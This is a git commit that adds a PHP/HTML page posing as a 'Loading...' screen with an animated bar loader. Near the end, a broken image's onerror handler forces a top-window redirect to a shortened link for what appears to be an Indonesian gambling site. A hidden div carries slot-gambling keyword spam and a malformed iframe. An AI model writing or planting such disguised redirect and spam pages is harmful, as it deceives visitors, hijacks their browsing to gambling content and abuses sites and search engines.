60bf49019d9747ff076513ebdcc42c68c4d71d88
kitadua <112356648+kitadua@users.noreply.github.com>
2023-02-19 18:08:01 +0700

    Create load.php

---
+++ fis/load.php
@@ -0,0 +1,86 @@
+<html dir='rtl'><head>
+<time datetime="2021-11-04T23:22:56+00:00"></time>
+<meta content='width=devicevswidth,minimumvscale=1,initialvscale=1' name='viewport'/>
+<meta name='robots' content='noarchive' />
+<title>Loading...</title>
+<style>
+body {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  background: #000;
+}
+.middle {
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  position: absolute;
+}
+.bar {
+  width: 10px;
+  height: 70px;
+  background: #fff;
+  display: inline-block;
+  transform-origin: bottom center;
+  border-top-right-radius: 20px;
+  border-top-left-radius: 20px;
+  /*   box-shadow:5px 10px 20px inset rgba(255,23,25.2); */
+  animation: loader 1.2s linear infinite;
+}
+.bar1 {
+  animation-delay: 0.1s;
+}
+.bar2 {
+  animation-delay: 0.2s;
+}
+.bar3 {
+  animation-delay: 0.3s;
+}
+.bar4 {
+  animation-delay: 0.4s;
+}
+.bar5 {
+  animation-delay: 0.5s;
+}
+.bar6 {
+  animation-delay: 0.6s;
+}
+.bar7 {
+  animation-delay: 0.7s;
+}
+.bar8 {
+  animation-delay: 0.8s;
+}
+
+@keyframes loader {
+  0% {
+    transform: scaleY(0.1);
+    background: ;
+  }
+  50% {
+    transform: scaleY(1);
+    background: yellowgreen;
+  }
+  100% {
+    transform: scaleY(0.1);
+    background: transparent;
+  }
+}
+</style>
+</head>
+<body>
+<div class="middle">
+  <div class="bar bar1"></div>
+  <div class="bar bar2"></div>
+  <div class="bar bar3"></div>
+  <div class="bar bar4"></div>
+  <div class="bar bar5"></div>
+  <div class="bar bar6"></div>
+  <div class="bar bar7"></div>
+  <div class="bar bar8"></div>
+</div>
+<img src="0" onerror="top.location.href='https://urlink.id/wismatoto'">
+<div style='visibility:hidden'> 
+<iframe width="100%" height="657" src="https://www.youtube.com/embed/t5O6uRJ0pUk" Kumpulan Situs Game Slot Deposit Pulsa 10rb Tanpa Potongan Terpercaya - <?php echo $title; ?>=>> ?</div>
+</body>
+</html>
